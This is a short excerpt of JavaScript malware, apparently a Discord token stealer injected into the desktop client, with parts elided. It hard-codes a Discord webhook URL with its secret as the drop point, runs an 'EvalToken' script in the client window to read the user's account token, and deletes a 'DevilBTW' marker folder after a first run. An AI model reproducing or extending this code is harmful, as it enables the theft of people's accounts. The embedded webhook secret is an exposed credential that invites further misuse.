...
const os = require('os')
var webhook = "https://discordapp.com/api/webhooks/925880471190142996/A6WlGRYgH33k1TAYUAdhIiZzQAGAq38N_fMcNOiHEkhXojXIXwWK_2pmuIRY6GpK0eaO";
...
function FirstTime() {
    ...
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => {
        ...
        if (!fs.existsSync(path.join(__dirname, "DevilBTW"))) {
            return !0
        }
        fs.rmdirSync(path.join(__dirname, "DevilBTW"));
